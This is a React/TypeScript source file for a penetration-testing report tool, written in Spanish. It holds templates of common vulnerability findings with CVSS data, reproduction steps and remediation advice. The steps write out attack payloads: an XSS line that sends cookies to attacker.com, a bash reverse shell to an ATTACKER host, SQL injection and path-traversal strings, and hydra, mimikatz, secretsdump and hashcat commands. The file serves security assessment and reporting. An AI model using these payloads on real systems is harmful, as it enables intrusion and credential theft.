/**
 * Biblioteca de Hallazgos — plantillas reutilizables de vulnerabilidades.
 * Colección curada de hallazgos comunes listos para importar a un engagement.
 * Organizada por categoría: Web App, Infraestructura, Red Team, etc.
 */

import { useState, useMemo } from 'react'
import { Search, BookOpen, Copy, CheckCircle2, Shield } from 'lucide-react'
import { Input } from '@/components/ui/input'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import { toast } from 'sonner'
import { cn } from '@/lib/utils'

// ─── Tipos ────────────────────────────────────────────────────────────────────
interface FindingTemplate {
  id: string
  title: string
  category: string
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info'
  cvss_score: number
  cvss_vector: string
  cwe_id: string
  cwe_name: string
  owasp: string
  description: string
  steps: string
  recommendation: string
  tags: string[]
}

// ─── Plantillas curadas ───────────────────────────────────────────────────────
const TEMPLATES: FindingTemplate[] = [
  // ── Web Application ─────────────────────────────────────────────────────────
  {
    id: 'sqli-01',
    title: 'SQL Injection (In-Band)',
    category: 'Web Application',
    severity: 'critical',
    cvss_score: 9.8,
    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    cwe_id: 'CWE-89', cwe_name: 'Improper Neutralization of Special Elements used in SQL Command',
    owasp: 'A03:2021 - Injection',
    description: 'Se identificó una vulnerabilidad de inyección SQL que permite a un atacante no autenticado manipular consultas a la base de datos. El input del usuario se concatena directamente en la consulta SQL sin usar prepared statements ni validación adecuada.',
    steps: '1. Identificar parámetros inyectables (GET, POST, headers, cookies)\n2. Probar comilla simple: \' — observar error de BD\n3. Confirmar con: \' OR \'1\'=\'1\n4. Extraer información: \' UNION SELECT null, version(), user()--\n5. Demostrar impacto: acceso a tablas sensibles',
    recommendation: '• Usar prepared statements / ORM en todas las consultas SQL\n• Validar y sanitizar todos los inputs del lado del servidor\n• Implementar principio de menor privilegio en la cuenta de BD\n• Deshabilitar mensajes de error detallados en producción\n• Usar WAF como capa adicional de defensa',
    tags: ['injection', 'database', 'authentication bypass'],
  },
  {
    id: 'xss-01',
    title: 'Cross-Site Scripting (XSS) — Reflected',
    category: 'Web Application',
    severity: 'medium',
    cvss_score: 6.1,
    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',
    cwe_id: 'CWE-79', cwe_name: 'Improper Neutralization of Input During Web Page Generation',
    owasp: 'A03:2021 - Injection',
    description: 'Se identificó una vulnerabilidad XSS reflected donde el input del usuario se refleja en la respuesta HTTP sin sanitización. Un atacante puede inyectar scripts maliciosos para robar cookies de sesión, redirigir usuarios, o ejecutar acciones en nombre de la víctima.',
    steps: '1. Identificar parámetros que se reflejan en la respuesta\n2. Inyectar payload básico: <script>alert(1)</script>\n3. Confirmar ejecución en el contexto de la página\n4. Demostrar robo de cookies: <script>document.location=\'http://attacker.com/?c=\'+document.cookie</script>\n5. Verificar si HttpOnly mitiga el robo de cookies',
    recommendation: '• Implementar Content Security Policy (CSP) estricta\n• Encodar output HTML (htmlspecialchars en PHP, escapeHtml en JS)\n• Usar cabecera X-XSS-Protection\n• Validar y rechazar inputs con caracteres especiales cuando no sean necesarios\n• Aplicar HttpOnly y Secure flags en cookies de sesión',
    tags: ['xss', 'client-side', 'session hijacking'],
  },
  {
    id: 'xss-02',
    title: 'Cross-Site Scripting (XSS) — Stored',
    category: 'Web Application',
    severity: 'high',
    cvss_score: 8.0,
    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N',
    cwe_id: 'CWE-79', cwe_name: 'Improper Neutralization of Input During Web Page Generation',
    owasp: 'A03:2021 - Injection',
    description: 'Se identificó XSS stored: el payload malicioso se persiste en la base de datos y se ejecuta cada vez que un usuario visita la página afectada. A diferencia del reflected, no requiere que la víctima haga clic en un enlace manipulado, impactando a todos los usuarios que acceden al recurso.',
    steps: '1. Identificar campos de entrada que se almacenan y muestran a otros usuarios\n2. Inyectar payload: <script>alert(document.domain)</script>\n3. Verificar que el payload se almacena y ejecuta al recargar\n4. Demostrar impacto: captura de cookies/tokens de administradores',
    recommendation: '• Sanitizar input al almacenar Y al mostrar\n• Usar librerías de sanitización (DOMPurify, OWASP Java HTML Sanitizer)\n• Implementar CSP con nonce para scripts inline\n• Content-Type correcto en todas las respuestas',
    tags: ['xss', 'stored', 'persistent'],
  },
  {
    id: 'idor-01',
    title: 'IDOR — Insecure Direct Object Reference',
    category: 'Web Application',
    severity: 'high',
    cvss_score: 7.5,
    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
    cwe_id: 'CWE-639', cwe_name: 'Authorization Bypass Through User-Controlled Key',
    owasp: 'A01:2021 - Broken Access Control',
    description: 'La aplicación expone referencias directas a objetos internos (IDs de usuario, registros, archivos) sin verificar que el usuario autenticado tenga autorización para acceder al recurso solicitado. Un atacante autenticado puede acceder a datos de otros usuarios modificando el identificador en la petición.',
    steps: '1. Identificar endpoints que reciben identificadores de objetos (user_id, order_id, doc_id)\n2. Registrar dos cuentas de prueba (A y B)\n3. Autenticarse como usuario A, obtener recurso propio\n4. Modificar el ID en la petición por el recurso del usuario B\n5. Verificar acceso no autorizado al recurso',
    recommendation: '• Implementar control de acceso basado en roles (RBAC) y verificar autorización en cada request\n• Usar identificadores indirectos o no predecibles (UUIDs)\n• Validar que el recurso pertenece al usuario autenticado antes de servirlo\n• Logging y alertas sobre accesos anómalos a recursos',
    tags: ['access control', 'authorization', 'horizontal privilege escalation'],
  },
  {
    id: 'ssrf-01',
    title: 'SSRF — Server-Side Request Forgery',
    category: 'Web Application',
    severity: 'high',
    cvss_score: 8.6,
    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N',
    cwe_id: 'CWE-918', cwe_name: 'Server-Side Request Forgery',
    owasp: 'A10:2021 - Server-Side Request Forgery',
    description: 'La aplicación realiza peticiones HTTP a URLs controladas por el usuario sin validación adecuada. Permite a un atacante hacer que el servidor realice peticiones a recursos internos inaccesibles desde internet (metadata de cloud, servicios internos, localhost), potencialmente exponiendo infraestructura interna.',
    steps: '1. Identificar funcionalidades que realizan peticiones a URLs (fetch URL, webhook, preview)\n2. Probar con URL propia: http://attacker.com/test\n3. Acceder a metadata de cloud: http://169.254.169.254/latest/meta-data/\n4. Escanear puertos internos: http://127.0.0.1:PUERTO\n5. Acceder a servicios internos no expuestos',
    recommendation: '• Implementar allowlist estricta de hosts/dominios permitidos\n• Bloquear peticiones a rangos IP privados (RFC 1918, 169.254.x.x)\n• Usar DNS rebinding protection\n• No redirigir respuestas completas al cliente\n• Separar el servidor que realiza requests externos de la red interna',
    tags: ['ssrf', 'cloud metadata', 'network pivoting'],
  },
  {
    id: 'cmdi-01',
    title: 'OS Command Injection',
    category: 'Web Application',
    severity: 'critical',
    cvss_score: 9.8,
    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    cwe_id: 'CWE-78', cwe_name: 'OS Command Injection',
    owasp: 'A03:2021 - Injection',
    description: 'La aplicación pasa input del usuario como parte de un comando del sistema operativo sin sanitización. Permite ejecución arbitraria de comandos con los privilegios del proceso del servidor web, potencialmente llevando a RCE completo.',
    steps: '1. Identificar funcionalidades que ejecutan comandos del SO (ping, nslookup, conversión de archivos)\n2. Probar separadores: ; | && || `\n3. Inyectar: ; id, | whoami, `cat /etc/passwd`\n4. Confirmar con time-based: ; sleep 5\n5. Obtener reverse shell: ; bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',
    recommendation: '• Evitar completamente el uso de funciones que ejecutan comandos del SO con input del usuario\n• Si es imprescindible, usar APIs del lenguaje (sin shell) y listas blancas de argumentos\n• Ejecutar el servidor web con el mínimo de privilegios posibles\n• Implementar sandbox/contenedor para el proceso',
    tags: ['rce', 'command injection', 'critical'],
  },
  {
    id: 'path-traversal-01',
    title: 'Path Traversal',
    category: 'Web Application',
    severity: 'high',
    cvss_score: 7.5,
    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
    cwe_id: 'CWE-22', cwe_name: 'Improper Limitation of a Pathname to a Restricted Directory',
    owasp: 'A01:2021 - Broken Access Control',
    description: 'La aplicación permite a usuarios leer archivos fuera del directorio web root mediante secuencias de traversal (../). Un atacante puede acceder a archivos de configuración, credenciales, claves privadas u otros archivos sensibles del sistema.',
    steps: '1. Identificar parámetros de carga de archivos (file=, page=, template=)\n2. Probar: ../../../../etc/passwd\n3. Probar encodings: %2e%2e%2f, ..%2f, %252e%252e%252f\n4. Objetivos: /etc/passwd, /etc/shadow, config.php, .env, id_rsa\n5. En Windows: ..\\..\\windows\\system32\\drivers\\etc\\hosts',
    recommendation: '• Validar y normalizar todas las rutas de archivo antes de usarlas\n• Usar realpath() para resolver la ruta real y verificar que esté dentro del directorio permitido\n• Implementar un mapping de nombres de archivo a rutas (no usar el nombre del usuario directamente)\n• Chroot jail o contenedores para limitar el filesystem accesible',
    tags: ['file inclusion', 'lfi', 'information disclosure'],
  },
  {
    id: 'csrf-01',
    title: 'CSRF — Cross-Site Request Forgery',
    category: 'Web Application',
    severity: 'medium',
    cvss_score: 6.5,
    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N',
    cwe_id: 'CWE-352', cwe_name: 'Cross-Site Request Forgery',
    owasp: 'A01:2021 - Broken Access Control',
    description: 'La aplicación no implementa protección CSRF en acciones sensibles. Un atacante puede engañar a un usuario autenticado para que realice acciones no deseadas (cambio de contraseña, transferencia de fondos, modificación de datos) simplemente haciendo que visite una página maliciosa.',
    steps: '1. Identificar acciones sensibles que modifican estado (POST sin token CSRF)\n2. Crear formulario HTML que realiza la petición automáticamente\n3. Verificar que la petición se acepta sin validación de origen\n4. Demostrar: cambio de email/contraseña via CSRF',
    recommendation: '• Implementar tokens CSRF sincronizados (STP - Synchronizer Token Pattern)\n• Usar cookie SameSite=Strict o SameSite=Lax\n• Verificar cabecera Origin/Referer en peticiones de estado\n• Double Submit Cookie pattern como alternativa',
    tags: ['csrf', 'authentication', 'session'],
  },
  {
    id: 'broken-auth-01',
    title: 'Autenticación Rota — Sin Bloqueo por Intentos',
    category: 'Web Application',
    severity: 'high',
    cvss_score: 7.5,
    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
    cwe_id: 'CWE-307', cwe_name: 'Improper Restriction of Excessive Authentication Attempts',
    owasp: 'A07:2021 - Identification and Authentication Failures',
    description: 'El endpoint de autenticación no implementa rate limiting ni bloqueo por intentos fallidos. Permite ataques de brute force y password spray sin restricciones, facilitando el acceso no autorizado mediante automatización.',
    steps: '1. Identificar el endpoint de login\n2. Realizar múltiples intentos fallidos sin recibir bloqueo ni captcha\n3. Confirmar con herramienta: hydra -l admin -P wordlist.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"\n4. Demostrar que no hay rate limiting (n solicitudes en t segundos sin bloqueo)',
    recommendation: '• Implementar rate limiting por IP y por cuenta (máx 5-10 intentos/min)\n• Bloqueo temporal progresivo tras intentos fallidos (lockout)\n• Implementar CAPTCHA tras N intentos fallidos\n• MFA obligatorio para cuentas privilegiadas\n• Alertas en tiempo real sobre intentos de brute force',
    tags: ['brute force', 'authentication', 'rate limiting'],
  },
  // ── Infraestructura ─────────────────────────────────────────────────────────
  {
    id: 'ssl-01',
    title: 'Protocolo SSL/TLS Obsoleto (TLS 1.0/1.1)',
    category: 'Infraestructura',
    severity: 'medium',
    cvss_score: 5.9,
    cvss_vector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N',
    cwe_id: 'CWE-326', cwe_name: 'Inadequate Encryption Strength',
    owasp: 'A02:2021 - Cryptographic Failures',
    description: 'El servidor acepta conexiones usando versiones obsoletas de TLS (1.0 y/o 1.1) que contienen vulnerabilidades conocidas (POODLE, BEAST, SWEET32). Estas versiones están deprecadas por el IETF desde 2021 y no deben habilitarse en producción.',
    steps: '1. Escanear con testssl.sh o sslscan\n2. testssl.sh --protocols TARGET:PORT\n3. Verificar si el servidor acepta TLSv1 y TLSv1.1\n4. Confirmar con openssl: openssl s_client -connect TARGET:443 -tls1\n5. Verificar también cipher suites débiles (RC4, DES, export)',
    recommendation: '• Deshabilitar TLS 1.0 y TLS 1.1 en toda la infraestructura\n• Habilitar solo TLS 1.2 y TLS 1.3\n• Configurar cipher suites fuertes (ECDHE, AES-GCM)\n• Habilitar HSTS (HTTP Strict Transport Security)\n• Verificar periódicamente con herramientas como SSL Labs',
    tags: ['ssl', 'tls', 'cryptography', 'network'],
  },
  {
    id: 'default-creds-01',
    title: 'Credenciales por Defecto',
    category: 'Infraestructura',
    severity: 'critical',
    cvss_score: 9.8,
    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    cwe_id: 'CWE-1392', cwe_name: 'Use of Default Credentials',
    owasp: 'A07:2021 - Identification and Authentication Failures',
    description: 'Se identificó acceso a un sistema/dispositivo utilizando credenciales predeterminadas de fábrica (admin/admin, admin/password, root/root, etc.). Las credenciales por defecto son públicamente conocidas y representan un vector de acceso trivial para un atacante.',
    steps: '1. Identificar el servicio/aplicación y su versión\n2. Consultar credenciales por defecto: defaultpasswords.info, cirt.net\n3. Intentar acceso con credenciales comunes del fabricante\n4. Documentar acceso exitoso y el nivel de privilegios obtenido',
    recommendation: '• Cambiar credenciales por defecto como primer paso del deployment\n• Implementar política de contraseñas fuertes y únicas\n• Usar gestores de contraseñas institucionales (Vaultwarden, 1Password Business)\n• Inventariar todos los dispositivos/servicios y verificar cambio de credenciales\n• Implementar escaneo periódico de credenciales por defecto',
    tags: ['credentials', 'authentication', 'critical', 'quick win'],
  },
  {
    id: 'open-redirect-01',
    title: 'Open Redirect',
    category: 'Web Application',
    severity: 'medium',
    cvss_score: 6.1,
    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',
    cwe_id: 'CWE-601', cwe_name: 'URL Redirection to Untrusted Site',
    owasp: 'A01:2021 - Broken Access Control',
    description: 'La aplicación acepta URLs externas sin validación en parámetros de redirección (redirect, returnUrl, next, url). Puede ser utilizado en campañas de phishing para engañar a usuarios con URLs aparentemente legítimas que redirigen a sitios maliciosos.',
    steps: '1. Identificar parámetros de redirección en la URL\n2. Sustituir el valor por URL externa: ?redirect=https://evil.com\n3. Confirmar la redirección al dominio externo\n4. Demostrar el riesgo de phishing con URL legítima en el dominio destino',
    recommendation: '• Implementar allowlist de URLs de redirección permitidas\n• Usar rutas relativas en lugar de URLs absolutas para redirects internos\n• Validar que el dominio de la URL de redirección coincide con el dominio propio\n• Mostrar una página de confirmación antes de redirigir a sitios externos',
    tags: ['redirect', 'phishing', 'client-side'],
  },
  {
    id: 'sensitive-data-01',
    title: 'Transmisión de Datos Sensibles Sin Cifrado',
    category: 'Infraestructura',
    severity: 'high',
    cvss_score: 7.5,
    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
    cwe_id: 'CWE-319', cwe_name: 'Cleartext Transmission of Sensitive Information',
    owasp: 'A02:2021 - Cryptographic Failures',
    description: 'Credenciales, tokens de sesión u otro tipo de información sensible se transmite en texto claro sobre HTTP (sin TLS). Un atacante en posición de man-in-the-middle puede capturar esta información y usarla para acceder a la aplicación.',
    steps: '1. Interceptar tráfico con Wireshark o mitmproxy\n2. Identificar transmisión de credenciales/tokens en HTTP\n3. Confirmar visibilidad de datos sensibles en texto claro\n4. Verificar también si hay mixed content (recursos HTTP en páginas HTTPS)',
    recommendation: '• Forzar HTTPS en toda la aplicación (redirect 301 de HTTP a HTTPS)\n• Implementar HSTS (Strict-Transport-Security) con preload\n• Configurar TLS 1.2/1.3 correctamente\n• Verificar que no hay mixed content\n• Marcar cookies como Secure',
    tags: ['cleartext', 'tls', 'man-in-the-middle'],
  },
  {
    id: 'clickjacking-01',
    title: 'Clickjacking — Sin X-Frame-Options',
    category: 'Web Application',
    severity: 'low',
    cvss_score: 3.1,
    cvss_vector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N',
    cwe_id: 'CWE-451', cwe_name: 'User Interface Misrepresentation of Critical Information',
    owasp: 'A05:2021 - Security Misconfiguration',
    description: 'La aplicación no implementa protección contra clickjacking. Puede ser embebida en un iframe en un sitio malicioso, engañando a usuarios para que realicen acciones no intencionadas al hacer clic en elementos invisibles superpuestos.',
    steps: '1. Crear una página HTML con un iframe apuntando a la aplicación\n2. Verificar que la aplicación carga correctamente en el iframe\n3. Confirmar ausencia de X-Frame-Options o CSP frame-ancestors\n4. Demostrar el ataque de clickjacking con un PoC visual',
    recommendation: '• Agregar X-Frame-Options: DENY o SAMEORIGIN en todas las respuestas\n• Implementar CSP con directiva frame-ancestors \'none\' o \'self\'\n• Usar JavaScript frame-busting como defense-in-depth (no como única medida)',
    tags: ['clickjacking', 'headers', 'ui redressing'],
  },
  // ── Red Team ────────────────────────────────────────────────────────────────
  {
    id: 'kerberoasting-01',
    title: 'Kerberoasting — Cuentas de Servicio Vulnerables',
    category: 'Active Directory',
    severity: 'high',
    cvss_score: 7.5,
    cvss_vector: 'CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N',
    cwe_id: 'CWE-522', cwe_name: 'Insufficiently Protected Credentials',
    owasp: '',
    description: 'Existen cuentas de servicio (SPNs) de Active Directory con contraseñas débiles vulnerables a Kerberoasting. Un usuario de dominio puede solicitar tickets TGS para estas cuentas y crackearlos offline sin necesidad de interactuar con el servicio.',
    steps: '1. Enumerar SPNs: GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER:PASS\n2. Solicitar tickets TGS: GetUserSPNs.py -request -dc-ip DC_IP DOMAIN/USER:PASS\n3. Guardar hashes en formato hashcat: $krb5tgs$...\n4. Crackear offline: hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule\n5. Demostrar acceso con la cuenta comprometida',
    recommendation: '• Implementar contraseñas de +25 caracteres aleatorios en cuentas de servicio (o usar gMSA)\n• Habilitar AES-only en cuentas de servicio (deshabilitar RC4)\n• Auditar regularmente cuentas con SPNs\n• Usar Group Managed Service Accounts (gMSA) que rotan automáticamente\n• Monitorear Event ID 4769 (TGS requests) en exceso',
    tags: ['active directory', 'kerberos', 'credential access', 'windows'],
  },
  {
    id: 'pass-the-hash-01',
    title: 'Pass-the-Hash — NTLM Authentication',
    category: 'Active Directory',
    severity: 'critical',
    cvss_score: 9.0,
    cvss_vector: 'CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H',
    cwe_id: 'CWE-294', cwe_name: 'Authentication Bypass by Capture-replay',
    owasp: '',
    description: 'Se obtuvo el hash NTLM de una cuenta de usuario con privilegios y se utilizó para autenticarse en otros sistemas sin conocer la contraseña en texto claro. Esto permite movimiento lateral extensivo en redes Windows con NTLM habilitado.',
    steps: '1. Extraer hashes NTLM: mimikatz "sekurlsa::logonpasswords"\n2. Autenticar con hash: crackmapexec smb TARGET -u USER -H NTLM_HASH\n3. Verificar acceso a sistemas adicionales\n4. Escalar: si es admin de dominio, extraer NTDS.dit\n5. Secretsdump: secretsdump.py DOMAIN/USER@DC_IP -hashes :NTLM_HASH',
    recommendation: '• Habilitar Windows Credential Guard para proteger LSASS\n• Añadir cuentas privilegiadas al grupo Protected Users\n• Implementar LAPS para contraseñas únicas de admin local\n• Habilitar SMB signing obligatorio para bloquear relay\n• Deshabilitar NTLM donde sea posible (usar solo Kerberos)',
    tags: ['active directory', 'lateral movement', 'pass-the-hash', 'windows'],
  },
  {
    id: 'vuln-service-01',
    title: 'Servicio con Vulnerabilidad Pública (CVE)',
    category: 'Infraestructura',
    severity: 'critical',
    cvss_score: 9.8,
    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    cwe_id: 'CWE-1035', cwe_name: 'Using Components with Known Vulnerabilities',
    owasp: 'A06:2021 - Vulnerable and Outdated Components',
    description: 'Se identificó un servicio expuesto con una versión vulnerable a una o más CVEs públicas. El servicio no ha sido parchado a pesar de la disponibilidad de actualizaciones de seguridad, exponiendo al sistema a exploits conocidos y disponibles públicamente.',
    steps: '1. Identificar versión del servicio: nmap -sV TARGET\n2. Buscar CVEs: searchsploit SERVICIO VERSIÓN, vulners.com, NVD\n3. Verificar si hay exploit disponible (Metasploit, PoC en GitHub)\n4. Ejecutar exploit de forma controlada y documentar acceso\n5. Reportar CVE ID, CVSS score y disponibilidad de exploit',
    recommendation: '• Implementar un programa de gestión de vulnerabilidades con SLA de parches\n• Aplicar el parche disponible o actualizar a versión sin vulnerabilidad\n• Si el parche no está disponible, implementar controles compensatorios (firewall, WAF, segmentación)\n• Mantener inventario de software actualizado (CMDB)\n• Suscribirse a boletines de seguridad del fabricante',
    tags: ['cve', 'patch management', 'known vulnerability'],
  },
]

// ─── Organización y constantes ────────────────────────────────────────────────
const CATEGORIES = [...new Set(TEMPLATES.map(t => t.category))]

const SEV_COLOR: Record<string, string> = {
  critical: 'bg-red-500/10 text-red-500 border-red-500/20',
  high:     'bg-orange-500/10 text-orange-500 border-orange-500/20',
  medium:   'bg-yellow-500/10 text-yellow-600 border-yellow-500/20',
  low:      'bg-blue-500/10 text-blue-500 border-blue-500/20',
  info:     'bg-muted text-muted-foreground border-border',
}

const SEV_LABEL: Record<string, string> = {
  critical: 'CRÍTICO', high: 'ALTO', medium: 'MEDIO', low: 'BAJO', info: 'INFO',
}

// ─── Componente ───────────────────────────────────────────────────────────────
export function Biblioteca() {
  const [search, setSearch]           = useState('')
  const [catFilter, setCatFilter]     = useState('all')
  const [sevFilter, setSevFilter]     = useState('all')
  const [selected, setSelected]       = useState<FindingTemplate | null>(null)
  const [copied, setCopied]           = useState(false)

  const filtered = useMemo(() => {
    const q = search.toLowerCase()
    return TEMPLATES.filter(t => {
      const matchSearch = !q ||
        t.title.toLowerCase().includes(q) ||
        t.cwe_id.toLowerCase().includes(q) ||
        t.description.toLowerCase().includes(q) ||
        t.tags.some(tag => tag.toLowerCase().includes(q))
      const matchCat = catFilter === 'all' || t.category === catFilter
      const matchSev = sevFilter === 'all' || t.severity === sevFilter
      return matchSearch && matchCat && matchSev
    })
  }, [search, catFilter, sevFilter])

  const copyTemplate = (t: FindingTemplate) => {
    const text = [
      `# ${t.title}`,
      `**CVE/CWE:** ${t.cwe_id} — ${t.cwe_name}`,
      `**OWASP:** ${t.owasp || 'N/A'}`,
      `**CVSS 3.1:** ${t.cvss_score} (${t.cvss_vector})`,
      '',
      '## Descripción',
      t.description,
      '',
      '## Pasos para reproducir',
      t.steps,
      '',
      '## Recomendación',
      t.recommendation,
    ].join('\n')

    navigator.clipboard.writeText(text).then(() => {
      setCopied(true)
      toast.success('Plantilla copiada al portapapeles')
      setTimeout(() => setCopied(false), 2000)
    })
  }

  const SEVERITIES = ['critical', 'high', 'medium', 'low']

  return (
    <div className='flex h-[calc(100vh-4rem)] -m-6'>
      {/* ── Sidebar ─────────────────────────────────────────────────────── */}
      <div className='w-80 shrink-0 border-r border-border flex flex-col bg-sidebar'>
        <div className='p-4 border-b border-border space-y-3'>
          <div>
            <h1 className='font-bold text-sm'>Biblioteca de Hallazgos</h1>
            <p className='text-xs text-muted-foreground mt-0.5'>{TEMPLATES.length} plantillas curadas</p>
          </div>
          <div className='relative'>
            <Search className='absolute left-2.5 top-1/2 size-3.5 -translate-y-1/2 text-muted-foreground' />
            <Input value={search} onChange={e => setSearch(e.target.value)}
              placeholder='Buscar hallazgo o CWE...' className='pl-8 h-8 text-xs' />
          </div>
          {/* Filtros */}
          <div className='space-y-2'>
            <div className='flex flex-wrap gap-1'>
              <button onClick={() => setCatFilter('all')}
                className={cn('rounded px-2 py-0.5 text-[10px] font-medium border transition-colors',
                  catFilter === 'all' ? 'bg-primary/10 text-primary border-primary/30' : 'border-border text-muted-foreground hover:border-primary/30')}>
                Todas
              </button>
              {CATEGORIES.map(c => (
                <button key={c} onClick={() => setCatFilter(c)}
                  className={cn('rounded px-2 py-0.5 text-[10px] font-medium border transition-colors',
                    catFilter === c ? 'bg-primary/10 text-primary border-primary/30' : 'border-border text-muted-foreground hover:border-primary/30')}>
                  {c}
                </button>
              ))}
            </div>
            <div className='flex gap-1'>
              <button onClick={() => setSevFilter('all')}
                className={cn('rounded px-2 py-0.5 text-[10px] font-medium border transition-colors',
                  sevFilter === 'all' ? 'bg-primary/10 text-primary border-primary/30' : 'border-border text-muted-foreground hover:border-primary/30')}>
                Todas
              </button>
              {SEVERITIES.map(s => (
                <button key={s} onClick={() => setSevFilter(s)}
                  className={cn('rounded px-2 py-0.5 text-[10px] font-bold border transition-colors',
                    sevFilter === s ? SEV_COLOR[s] : 'border-border text-muted-foreground hover:border-primary/30')}>
                  {SEV_LABEL[s]}
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Lista */}
        <div className='flex-1 overflow-y-auto py-1'>
          {filtered.length === 0 ? (
            <div className='flex flex-col items-center gap-2 py-12 text-center px-4'>
              <BookOpen className='size-8 text-muted-foreground/30' />
              <p className='text-xs text-muted-foreground'>Sin resultados.</p>
            </div>
          ) : (
            filtered.map(t => (
              <button key={t.id} onClick={() => setSelected(t)}
                className={cn(
                  'w-full text-left px-4 py-3 border-l-2 transition-colors',
                  selected?.id === t.id
                    ? 'bg-sidebar-accent border-primary'
                    : 'border-transparent hover:bg-sidebar-accent/50'
                )}>
                <div className='flex items-start justify-between gap-2'>
                  <span className={cn('shrink-0 rounded border px-1.5 py-0.5 text-[10px] font-bold', SEV_COLOR[t.severity])}>
                    {SEV_LABEL[t.severity]}
                  </span>
                  <span className='text-[10px] text-muted-foreground shrink-0'>{t.cvss_score.toFixed(1)}</span>
                </div>
                <p className='text-xs font-medium mt-1.5 leading-tight'>{t.title}</p>
                <p className='text-[10px] text-muted-foreground mt-0.5'>{t.category} · {t.cwe_id}</p>
              </button>
            ))
          )}
        </div>
      </div>

      {/* ── Detalle ─────────────────────────────────────────────────────── */}
      <div className='flex-1 overflow-y-auto'>
        {!selected ? (
          <div className='flex flex-col items-center justify-center h-full gap-3 text-center'>
            <Shield className='size-14 text-muted-foreground/20' />
            <p className='text-sm text-muted-foreground'>Seleccioná una plantilla para ver el detalle.</p>
          </div>
        ) : (
          <div className='p-8 max-w-2xl space-y-6'>
            {/* Header */}
            <div>
              <div className='flex items-center gap-3 mb-3 flex-wrap'>
                <Badge variant='outline' className={cn('border font-bold text-xs px-2 py-1', SEV_COLOR[selected.severity])}>
                  {SEV_LABEL[selected.severity]}
                </Badge>
                <code className='font-mono text-xs bg-muted border border-border rounded px-2 py-1'>
                  {selected.cvss_vector.replace('CVSS:3.1/', '')}
                </code>
                <span className='text-sm font-bold text-primary'>{selected.cvss_score.toFixed(1)}</span>
                <Button variant='outline' size='sm' className='ml-auto h-7 text-xs'
                  onClick={() => copyTemplate(selected)}>
                  {copied ? <CheckCircle2 className='mr-1.5 size-3.5 text-green-500' /> : <Copy className='mr-1.5 size-3.5' />}
                  {copied ? 'Copiado' : 'Copiar plantilla'}
                </Button>
              </div>
              <h2 className='text-2xl font-bold leading-tight'>{selected.title}</h2>
              <div className='flex flex-wrap gap-2 mt-2'>
                <span className='text-xs text-muted-foreground'>{selected.category}</span>
                <span className='text-xs font-mono text-primary'>{selected.cwe_id}</span>
                {selected.owasp && <span className='text-xs text-muted-foreground'>{selected.owasp}</span>}
              </div>
            </div>

            {/* Descripción */}
            <div>
              <p className='text-xs font-semibold uppercase tracking-widest text-muted-foreground mb-2'>Descripción</p>
              <p className='text-sm leading-relaxed'>{selected.description}</p>
            </div>

            {/* Tags */}
            <div className='flex flex-wrap gap-1.5'>
              {selected.tags.map(tag => (
                <span key={tag} className='text-[10px] bg-muted border border-border rounded px-2 py-0.5 text-muted-foreground'>
                  {tag}
                </span>
              ))}
            </div>

            {/* Pasos */}
            <div className='rounded-lg border border-border bg-muted/30 p-4'>
              <p className='text-xs font-semibold uppercase tracking-widest text-muted-foreground mb-2'>Pasos para reproducir</p>
              <pre className='text-xs text-foreground/80 whitespace-pre-wrap leading-relaxed font-mono'>{selected.steps}</pre>
            </div>

            {/* Recomendación */}
            <div className='rounded-lg border border-green-500/20 bg-green-500/5 p-4'>
              <p className='text-xs font-semibold uppercase tracking-widest text-green-500 mb-2'>Recomendación</p>
              <pre className='text-xs text-muted-foreground whitespace-pre-wrap leading-relaxed'>{selected.recommendation}</pre>
            </div>

            <div className='rounded-lg border border-border bg-muted/30 p-4'>
              <p className='text-xs text-muted-foreground'>
                💡 Usá <strong>Copiar plantilla</strong> para llevar este contenido al workspace del engagement. Próximamente: importar directamente como hallazgo.
              </p>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
